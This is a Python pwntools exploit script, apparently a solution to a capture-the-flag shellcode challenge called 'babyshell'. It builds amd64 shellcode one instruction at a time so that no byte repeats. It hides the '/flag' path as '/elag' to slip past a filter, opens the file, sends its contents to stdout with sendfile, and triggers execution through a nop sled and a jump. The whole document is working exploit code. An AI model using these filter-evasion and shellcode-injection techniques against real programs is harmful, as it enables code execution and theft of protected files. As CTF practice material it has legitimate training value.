from pwn import *
import collections
import sys, os
import time
import tty


class io:
    @classmethod
    def connect(cls):
        binary = sys.argv[0].split('.py')[0]
        if '/' in binary:
            binary = binary.split('/')[-1]
        binary = '/pwn/babyshell/' + binary
        cls.io = process(binary)
    @classmethod
    def readuntil(cls, x, timeout = None):
        return cls.readuntil_internal(x, time_out = timeout)
    @classmethod
    def readuntil_internal(cls, x, time_out):
        ret = cls.io.readuntil(x, timeout = time_out) if time_out else cls.io.readuntil(x)
        sys.stdout.write(ret)
        return ret
    @classmethod
    def write(cls, x):
        sys.stdout.write(x)
        cls.io.write(x)
    @classmethod
    def sendline(cls, x):
        cls.write(x + '\n')
    @classmethod
    def close(cls):
        cls.io.close()
    @classmethod
    def interactive(cls):
        cls.io.interactive()
    @classmethod
    def pid(cls):
        return util.proc.pidof(cls.io)[0]


def bxock_stdout():
    sys.stdout = open(os.devnull, 'w')

def restore_stdout():
    sys.stdout = sys.__stdout__


class MyException(Exception):
    pass
desired_len = 255
def check_illegal(pl, x):
    bad = [ i for i in x if i in pl ]
    if len(bad) > 0:
        io.close()
        print 'You put bad chars in'
        raise MyException
def check_user_error(pl):
    most_used = collections.Counter(pl).most_common(1)[0]
    if most_used[1] > 1:
        io.close()
        print 'Char used more than once in your shellcode!!!'
        print repr(pl)
        raise MyException

def garbage(pl, x):
    return ''.join([ chr(i) for i in range(256) if chr(i) not in (pl+x) ])
def verify_pl(pl, x):
    if len(pl) != desired_len:
        io.close()
        print 'Wrong len???'
        print 'Desired = ' + str(desired_len)
        print 'Actual = ' + str(len(pl))
        raise MyException
    most_used = collections.Counter(pl).most_common(1)[0]
    if most_used[1] > 1:
        io.close()
        print 'Char used more than once!'
        if most_used[0] in x:
            print most_used[0] + ' used in your shellcode also!'
        print repr(pl)
        print most_used
        raise MyException

def deliver(inp, is_raw = False):
    global desired_len
    x = inp if is_raw else asm(inp)
    try:
        check_user_error(x)

        # Setup
        pl_prefix = asm('pop rbx\nmov bx, 0x51d0\ncall rbx')
        check_illegal(pl_prefix, x)

        # Filler
        filler = garbage(pl_prefix, x)[:( desired_len - len(pl_prefix+x) )]
        pl = pl_prefix + filler + x
        verify_pl(pl, x)
        desired_len -= len(x)
        io.write(pl)

        io.readuntil('stdin into'); io.readuntil('\n')
        return len(pl_prefix + filler)
    except MyException:
        print 'This happened for input: ' + inp
        raise MyException

def main():
    global desired_len
    sc = shellcraft.amd64
    context.arch = 'amd64'
    context.os = 'linux'

    io.connect()
    io.readuntil('bytes from stdin into ')
    addr = int(io.readuntil('\n').split('.')[0][2:], 16)

    # Must do instructions in REVERSE order
    desired_len = 100

    # ascii
    flag_location = addr + deliver('/elag\0', True)   # /elag must be altered!

    # sendline
    deliver('syscall')
    deliver('xor rax, rax\nmov al, 40')
    deliver('shl r10, 8')  # r10 = 0x4000
    deliver('mov r10b, 64')
    deliver('mov r10, rdx')
    deliver('xor rdx, rdx')  # rdx = 0
    deliver('mov rdi, rax')  # rdi = 1
    deliver('inc al')
    deliver('xor rax, rax')
    deliver('mov rsi, rax')  # rsi = fd

    # Open /flag
    deliver('syscall')
    deliver('add al, 2')
    deliver('add rdi, ' + str(flag_location))
    deliver('mov rdi, rax')
    deliver('mov rsi, rax')
    deliver('xor rax, rax')

    # Fix flag
    print 'Start reading from offset ' + str(desired_len)
    deliver('inc byte ptr [' + str(flag_location + 1) + ']')

    # Nop sled
    while desired_len > 20:
        deliver('nop')

    # Fire the exploit
    io.write('\xeb\x13')

if __name__ == '__main__':
    while True:
        try:
            main()
            break
        except:
            io.close()
    io.interactive()
